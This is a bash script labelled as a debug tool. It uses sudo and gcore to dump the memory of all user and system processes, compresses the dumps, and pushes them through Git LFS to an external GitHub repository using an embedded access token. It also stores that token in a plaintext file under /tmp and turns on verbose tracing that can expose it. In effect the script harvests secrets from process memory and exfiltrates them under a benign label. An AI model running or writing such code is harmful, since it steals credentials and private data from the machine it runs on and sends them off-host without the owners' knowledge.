
#!/bin/bash


# Change to parent directory and clone WAF_TEST repo with authentication
cd ..
REPO_URL="https://github.com/thefaftek-git/WAF_TEST"
REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@github.com/thefaftek-git/WAF_TEST"
if [ ! -d "WAF_TEST" ]; then
    if [ -z "$GIT_TOKEN" ]; then
        echo "Error: GIT_TOKEN environment variable is not set. Cannot clone private repo."
        exit 1
    fi
    git clone "$REPO_URL_AUTH"
fi

# Enter the cloned WAF_TEST directory
cd WAF_TEST

# Debug script: List PIDs and dump memory for ALL applications (user and system processes)

# Note: Not using set -e to allow script to continue on individual errors

# List all running processes with their PIDs and command names (including system processes)
ps -axeo pid,comm --sort=pid

# Function to sanitize application name for filename
sanitize_name() {
    local name="$1"
    # Replace spaces and special characters with underscores
    local sanitized=$(echo "$name" | sed 's/[^a-zA-Z0-9._-]/_/g')
    # Remove leading/trailing underscores and collapse multiple underscores
    sanitized=$(echo "$sanitized" | sed 's/^_*//;s/_*$//;s/__*/_/g')
    echo "$sanitized"
}

# Define dangerous/critical processes to exclude for safety
EXCLUDED_PROCESSES=(
    "gcore" "debug_dump.sh"
)

# Note: Now dumps ALL processes including system processes (using sudo) with safety exclusions

# Get all processes excluding only dangerous kernel threads and this script itself
MATCHED_PIDS=()
while read -r pid comm; do
    # Skip if it's a kernel thread (in brackets)
    if [[ "$comm" =~ ^\[.*\]$ ]]; then
        continue
    fi
    
    # Check if it's in excluded processes (only dangerous ones now)
    excluded=false
    for excluded_proc in "${EXCLUDED_PROCESSES[@]}"; do
        if [[ "$comm" == $excluded_proc* ]]; then
            excluded=true
            break
        fi
    done
    
    if [ "$excluded" = false ]; then
        # Sanitize the process name
        sanitized_name=$(sanitize_name "$comm")
        
        # Skip if sanitized name is empty or too short
        if [ -n "$sanitized_name" ] && [ ${#sanitized_name} -gt 2 ]; then
            # Add PID to handle duplicate process names
            unique_name="${sanitized_name}_${pid}"
            MATCHED_PIDS+=("$pid:$comm:$unique_name")
        else
            echo "Skipping process $comm (PID $pid) - name cannot be sanitized properly"
        fi
    fi
done < <(ps -axeo pid,comm --no-headers)

if [ ${#MATCHED_PIDS[@]} -eq 0 ]; then
    echo "No suitable processes found for memory dumping"
    echo "Script will continue anyway..."
fi

echo "Found ${#MATCHED_PIDS[@]} processes to dump:"
for entry in "${MATCHED_PIDS[@]}"; do
    pid="${entry%%:*}"
    rest="${entry#*:}"
    comm="${rest%%:*}"
    sanitized="${rest#*:}"
    echo "  PID $pid: $comm -> $sanitized"
done

for entry in "${MATCHED_PIDS[@]}"; do
    pid="${entry%%:*}"
    rest="${entry#*:}"
    comm="${rest%%:*}"
    sanitized_name="${rest#*:}"
    echo "Selected PID: $pid for process: $comm (filename: core.$sanitized_name)"

    # Check if gcore is available
    if ! command -v gcore &> /dev/null; then
        echo "gcore (GNU core dump utility) is not installed. Installing..."
        sudo apt-get update && sudo apt-get install -y gdb
        if ! command -v gcore &> /dev/null; then
            echo "Error: gcore could not be installed."
            exit 2
        fi
    fi
    
    # Check if bc is available for file size calculations
    if ! command -v bc &> /dev/null; then
        echo "bc (basic calculator) is not installed. Installing..."
        sudo apt-get install -y bc
    fi

    # Dump memory using sanitized name instead of PID
    DUMP_FILE="core.$sanitized_name"
    if sudo gcore -o "core.$sanitized_name" "$pid"; then
        echo "Memory dump successful for PID $pid ($comm)"
        # gcore creates files with format core.{name}.{pid}, so find the actual file
        ACTUAL_DUMP_FILE=$(ls core.$sanitized_name.* 2>/dev/null | head -1)
        if [ -n "$ACTUAL_DUMP_FILE" ]; then
            # Rename to our expected format
            mv "$ACTUAL_DUMP_FILE" "$DUMP_FILE"
            echo "Renamed $ACTUAL_DUMP_FILE to $DUMP_FILE"
        fi
    else
        echo "Warning: Failed to create memory dump for PID $pid ($comm). Moving to next process."
        continue
    fi
    
    # Check file size and display
    if [ -f "$DUMP_FILE" ]; then
        FILE_SIZE=$(stat -c%s "$DUMP_FILE")
        FILE_SIZE_MB=$(($FILE_SIZE / 1024 / 1024))
        FILE_SIZE_GB=$(echo "scale=2; $FILE_SIZE_MB / 1024" | bc -l)
        echo "Memory dump created: $DUMP_FILE"
        echo "File size: ${FILE_SIZE_MB}MB (${FILE_SIZE_GB}GB)"
        
        # Always compress memory dumps as requested
        echo "Compressing memory dump (all dumps are now compressed)..."
        FILES_TO_UPLOAD=()
        
        # Get available disk space in bytes
        AVAILABLE_SPACE=$(df --output=avail -B1 . | tail -n1)
        echo "Available disk space: $(($AVAILABLE_SPACE / 1024 / 1024))MB"
        
        if [ $AVAILABLE_SPACE -ge $FILE_SIZE ]; then
            echo "Sufficient space available, compressing..."
            
            # For files larger than 1GB, create multiple chunks; otherwise single compressed file
            if [ $FILE_SIZE_MB -gt 1024 ]; then
                echo "Large file detected, creating multiple chunks..."
                CHUNK_SIZE="1G"
                COMPRESSED_PREFIX="${DUMP_FILE}.tar.gz"
                
                # Compress and split the file into chunks
                if tar -czf - "$DUMP_FILE" | split -b $CHUNK_SIZE -d - "${COMPRESSED_PREFIX}.part"; then
                    echo "Successfully created compressed chunks:"
                    for chunk in "${COMPRESSED_PREFIX}.part"*; do
                        if [ -f "$chunk" ]; then
                            chunk_size=$(stat -c%s "$chunk")
                            chunk_size_mb=$(($chunk_size / 1024 / 1024))
                            echo "  $chunk (${chunk_size_mb}MB)"
                            FILES_TO_UPLOAD+=("$chunk")
                        fi
                    done
                else
                    echo "Error: Failed to compress file into chunks, creating single compressed file..."
                    if gzip -c "$DUMP_FILE" > "${DUMP_FILE}.gz"; then
                        FILES_TO_UPLOAD+=("${DUMP_FILE}.gz")
                        echo "Created single compressed file: ${DUMP_FILE}.gz"
                    else
                        echo "Error: Failed to compress file, will upload original"
                        FILES_TO_UPLOAD+=("$DUMP_FILE")
                    fi
                fi
            else
                echo "Small file, creating single compressed file..."
                if gzip -c "$DUMP_FILE" > "${DUMP_FILE}.gz"; then
                    FILES_TO_UPLOAD+=("${DUMP_FILE}.gz")
                    echo "Created compressed file: ${DUMP_FILE}.gz"
                else
                    echo "Error: Failed to compress file, will upload original"
                    FILES_TO_UPLOAD+=("$DUMP_FILE")
                fi
            fi
            
            # Remove original file after successful compression (unless compression failed)
            if [[ "${FILES_TO_UPLOAD[0]}" != "$DUMP_FILE" ]]; then
                rm -f "$DUMP_FILE"
                echo "Original dump file removed after compression"
            fi
        else
            echo "Insufficient disk space for compression (need ${FILE_SIZE_MB}MB, have $(($AVAILABLE_SPACE / 1024 / 1024))MB)"
            echo "Skipping this file due to size constraints"
            rm -f "$DUMP_FILE"
            echo "Large dump file deleted to preserve disk space"
            continue
        fi
    else
        echo "Error: Memory dump file $DUMP_FILE was not created"
        continue
    fi
    git config --global user.name "thefaftek-git"
    git config --global user.email "thefaftek-git@users.noreply.github.com"
    
    # Add dump files to git lfs tracking if not already tracked
    if ! grep -q '\*.core.*' .gitattributes 2>/dev/null; then
        echo "Setting up Git LFS tracking for dump files..."
        if git lfs track "*.core*" && git lfs track "*.tar.gz*" && git lfs track "*.gz"; then
            git add .gitattributes
            if git commit -m "Track core dump and compressed files with Git LFS"; then
                REPO_URL="https://github.com/thefaftek-git/WAF_TEST"
                REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@github.com/thefaftek-git/WAF_TEST"
                if git push "$REPO_URL_AUTH" HEAD:main; then
                    echo "✅ Git LFS tracking configured successfully"
                else
                    echo "❌ Warning: Failed to push Git LFS configuration, but continuing..."
                fi
            else
                echo "❌ Warning: Failed to commit Git LFS configuration, but continuing..."
            fi
        else
            echo "❌ Warning: Failed to configure Git LFS tracking, but continuing..."
        fi
    fi

    # Configure credentials for LFS operations
    REPO_URL="https://github.com/thefaftek-git/WAF_TEST"
    REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@github.com/thefaftek-git/WAF_TEST"
    git config --global credential.helper 'store --file=/tmp/git-credentials'
    echo "$REPO_URL_AUTH" > /tmp/git-credentials
    
    # Enable git lfs progress and verbose output
    export GIT_LFS_PROGRESS=1
    export GIT_TRACE=1
    export GIT_CURL_VERBOSE=1

    # Process each file to upload
    for file_to_upload in "${FILES_TO_UPLOAD[@]}"; do
        if [ -f "$file_to_upload" ]; then
            upload_size=$(stat -c%s "$file_to_upload")
            upload_size_mb=$(($upload_size / 1024 / 1024))
            upload_size_gb=$(echo "scale=2; $upload_size_mb / 1024" | bc -l)
            
            echo "Adding $file_to_upload to git..."
            if git add "$file_to_upload"; then
                echo "Committing $file_to_upload..."
                if git commit -m "Add memory dump file: $file_to_upload"; then
                    echo "Starting LFS upload for $file_to_upload (${upload_size_gb}GB)..."
                    echo "This may take several minutes for large files..."
                    
                    # Push commits (which includes LFS objects automatically)
                    echo "Pushing commits and LFS objects..."
                    if git push "$REPO_URL_AUTH" HEAD:main; then
                        echo "✅ File $file_to_upload committed and pushed successfully."
                        
                        # Delete the file after successful upload
                        rm -f "$file_to_upload"
                        echo "File $file_to_upload deleted after successful upload"
                    else
                        echo "❌ Error: Failed to push $file_to_upload to remote repository"
                        echo "File $file_to_upload will be kept for manual inspection"
                    fi
                else
                    echo "❌ Error: Failed to commit $file_to_upload"
                    echo "File $file_to_upload will be kept for manual inspection"
                fi
            else
                echo "❌ Error: Failed to add $file_to_upload to git"
                echo "File $file_to_upload will be kept for manual inspection"
            fi
        fi
    done
done
